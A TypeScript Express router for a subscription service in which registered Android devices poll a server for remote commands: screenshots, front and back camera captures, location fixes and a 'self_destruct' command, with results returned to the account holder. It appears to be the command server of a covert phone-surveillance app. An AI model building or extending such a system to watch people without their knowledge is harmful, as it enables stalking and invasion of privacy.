import { Router } from 'express';
import bcrypt from 'bcryptjs';
import { z } from 'zod';
import { prisma } from '../lib/prisma';
import { generateDeviceToken, signDeviceToken } from '../lib/jwt';
import { requireAuth, requireDevice, AuthRequest } from '../middleware/auth';
import { isSubscriptionActive } from '../lib/subscription';

const router = Router();

const registerDeviceSchema = z.object({
  email: z.string().email(),
  password: z.string(),
  deviceName: z.string().min(1),
  androidId: z.string().min(1),
  apkVersion: z.string().optional(),
  manufacturer: z.string().optional(),
  model: z.string().optional(),
});

const createCommandSchema = z.object({
  type: z.enum(['screenshot', 'camera_front', 'camera_back', 'location', 'self_destruct']),
});

const completeCommandSchema = z.object({
  status: z.enum(['completed', 'failed']),
  resultUrl: z.string().optional(),
  latitude: z.number().optional(),
  longitude: z.number().optional(),
  accuracy: z.number().optional(),
  errorMsg: z.string().optional(),
});

function parsePermissionStatus(raw: string | null) {
  if (!raw) return null;
  try {
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

function formatDevice(device: {
  id: string;
  userId: string;
  deviceName: string;
  androidId: string;
  apkVersion: string;
  manufacturer: string | null;
  model: string | null;
  permissionStatus: string | null;
  lastSeen: Date | null;
  isActive: boolean;
  createdAt: Date;
  user?: { email: string };
}) {
  return {
    ...device,
    permissionStatus: parsePermissionStatus(device.permissionStatus),
  };
}

async function verifyDeviceAccess(deviceId: string, userId: string, role: string) {
  const device = await prisma.device.findUnique({ where: { id: deviceId } });
  if (!device) return null;
  if (role !== 'admin' && device.userId !== userId) return null;
  return device;
}

router.post('/register', async (req, res) => {
  try {
    const data = registerDeviceSchema.parse(req.body);
    const normalizedEmail = data.email.trim().toLowerCase();
    const user = await prisma.user.findUnique({ where: { email: normalizedEmail } });
    if (!user || !user.isActive) {
      return res.status(401).json({ error: 'Geçersiz e-posta veya şifre' });
    }
    const valid = await bcrypt.compare(data.password, user.passwordHash);
    if (!valid) {
      return res.status(401).json({ error: 'Geçersiz e-posta veya şifre' });
    }
    if (!isSubscriptionActive(user.subscriptionExpiresAt, user.role)) {
      return res.status(403).json({ error: 'Abonelik süresi dolmuş. Yönetici ile iletişime geçin.' });
    }

    const deviceToken = generateDeviceToken();
    const existing = await prisma.device.findUnique({ where: { androidId: data.androidId } });

    const deviceData = {
      userId: user.id,
      deviceName: data.deviceName,
      deviceToken,
      apkVersion: data.apkVersion || '1.0.0',
      manufacturer: data.manufacturer,
      model: data.model,
      lastSeen: new Date(),
      isActive: true,
    };

    let device;
    if (existing) {
      device = await prisma.device.update({ where: { id: existing.id }, data: deviceData });
    } else {
      device = await prisma.device.create({
        data: { ...deviceData, androidId: data.androidId },
      });
    }

    const jwtToken = signDeviceToken(device.id);
    res.status(201).json({
      deviceId: device.id,
      deviceToken: jwtToken,
      userId: user.id,
      menuPin: user.menuPin,
    });
  } catch (e) {
    if (e instanceof z.ZodError) {
      return res.status(400).json({ error: e.errors[0].message });
    }
    console.error(e);
    res.status(500).json({ error: 'Cihaz kaydı başarısız' });
  }
});

router.post('/sync', requireDevice, async (req: AuthRequest, res) => {
  try {
    const permissions = req.body?.permissions;
    const manufacturer = req.body?.manufacturer as string | undefined;
    const model = req.body?.model as string | undefined;

    await prisma.device.update({
      where: { id: req.deviceId },
      data: {
        lastSeen: new Date(),
        manufacturer,
        model,
        permissionStatus: permissions ? JSON.stringify(permissions) : undefined,
      },
    });

    const device = await prisma.device.findUnique({
      where: { id: req.deviceId! },
      include: { user: { select: { menuPin: true, subscriptionExpiresAt: true, role: true, isActive: true } } },
    });
    if (!device?.user?.isActive || !isSubscriptionActive(device.user.subscriptionExpiresAt, device.user.role)) {
      return res.status(403).json({ error: 'Abonelik süresi dolmuş' });
    }

    const commands = await prisma.deviceCommand.findMany({
      where: { deviceId: req.deviceId!, status: 'pending' },
      orderBy: { createdAt: 'asc' },
      take: 5,
      select: { id: true, type: true, createdAt: true },
    });

    res.json({ ok: true, commands, menuPin: device.user.menuPin });
  } catch (e) {
    console.error('sync error:', e);
    res.status(500).json({ error: 'Senkron başarısız' });
  }
});

router.post('/heartbeat', requireDevice, async (req: AuthRequest, res) => {
  await prisma.device.update({
    where: { id: req.deviceId },
    data: { lastSeen: new Date() },
  });
  res.json({ ok: true });
});

router.post('/commands/:commandId/complete', requireDevice, async (req: AuthRequest, res) => {
  try {
    const data = completeCommandSchema.parse(req.body);
    const command = await prisma.deviceCommand.findUnique({
      where: { id: req.params.commandId },
    });
    if (!command || command.deviceId !== req.deviceId) {
      return res.status(404).json({ error: 'Komut bulunamadı' });
    }

    await prisma.deviceCommand.update({
      where: { id: command.id },
      data: {
        status: data.status,
        resultUrl: data.resultUrl,
        resultLat: data.latitude,
        resultLng: data.longitude,
        resultAcc: data.accuracy,
        errorMsg: data.errorMsg,
        completedAt: new Date(),
      },
    });

    res.json({ ok: true });
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    console.error(e);
    res.status(500).json({ error: 'Komut tamamlanamadı' });
  }
});

router.get('/', requireAuth, async (req: AuthRequest, res) => {
  const where = req.user!.role === 'admin' ? {} : { userId: req.user!.userId };
  const devices = await prisma.device.findMany({
    where,
    orderBy: { lastSeen: 'desc' },
    include: { user: { select: { email: true } } },
  });
  res.json(devices.map(formatDevice));
});

router.post('/:deviceId/commands', requireAuth, async (req: AuthRequest, res) => {
  try {
    const { type } = createCommandSchema.parse(req.body);
    const device = await verifyDeviceAccess(req.params.deviceId, req.user!.userId, req.user!.role);
    if (!device) return res.status(404).json({ error: 'Cihaz bulunamadı' });

    const command = await prisma.deviceCommand.create({
      data: { deviceId: device.id, type },
    });

    res.status(201).json(command);
  } catch (e) {
    if (e instanceof z.ZodError) return res.status(400).json({ error: e.errors[0].message });
    res.status(500).json({ error: 'Komut oluşturulamadı' });
  }
});

router.get('/:deviceId/commands/:commandId', requireAuth, async (req: AuthRequest, res) => {
  const device = await verifyDeviceAccess(req.params.deviceId, req.user!.userId, req.user!.role);
  if (!device) return res.status(404).json({ error: 'Cihaz bulunamadı' });

  const command = await prisma.deviceCommand.findFirst({
    where: { id: req.params.commandId, deviceId: device.id },
  });
  if (!command) return res.status(404).json({ error: 'Komut bulunamadı' });
  res.json(command);
});

router.get('/:id', requireAuth, async (req: AuthRequest, res) => {
  const device = await prisma.device.findUnique({
    where: { id: req.params.id },
    include: { user: { select: { email: true } } },
  });
  if (!device) return res.status(404).json({ error: 'Cihaz bulunamadı' });
  if (req.user!.role !== 'admin' && device.userId !== req.user!.userId) {
    return res.status(403).json({ error: 'Erişim reddedildi' });
  }
  res.json(formatDevice(device));
});

export default router;
